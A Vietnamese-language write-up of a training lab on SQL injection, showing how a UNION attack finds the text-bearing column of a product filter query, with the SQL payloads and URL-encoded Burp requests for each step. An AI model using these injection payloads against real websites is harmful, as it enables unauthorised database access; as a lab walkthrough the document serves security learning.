# SQL Injection Lab 08: UNION Attack - Finding a Column Containing Text

## Mục tiêu
Xác định cột có thể chứa dữ liệu text và hiển thị chuỗi yêu cầu của lab `KOkBKp`.

## Đề bài
<img src="images/08_union-text-column-2026-04-14-22-40-05.png" alt="Lab overview" width="760" />
<br><br>

## Bước 1: Xác nhận số cột

```sql
' union select null, null, null --
```

Query trong Burp:

```http
GET /filter?category=%27%20union%20select%20null%2C%20null%2C%20null%20-- HTTP/2
```

<img src="images/08_union-text-column-2026-04-14-22-44-47.png" alt="Baseline 3 cột" width="760" />
<br><br>

## Bước 2: Test cột text

```sql
' union select 'aa', null, null --
```

Query trong Burp:

```http
GET /filter?category=%27%20union%20select%20%27aa%27%2C%20null%2C%20null%20-- HTTP/2
```

Kết quả lỗi `Internal Server Error`.

<img src="images/08_union-text-column-2026-04-14-22-46-32.png" alt="Test cột text lỗi" width="760" />
<br><br>

## Bước 3: Đưa chuỗi lab vào cột phù hợp

```sql
' union select null, 'KOkBKp', null --
```

Query trong Burp:

```http
GET /filter?category=%27%20union%20select%20null%2C%20%27KOkBKp%27%2C%20null%20-- HTTP/2
```

<img src="images/08_union-text-column-2026-04-14-22-47-56.png" alt="Lab solved" width="760" />
<br><br>

## Payload solve

```sql
' union select null, 'KOkBKp', null --
```

## Kết quả
Chuỗi `KOkBKp` xuất hiện trên giao diện và lab được solve.
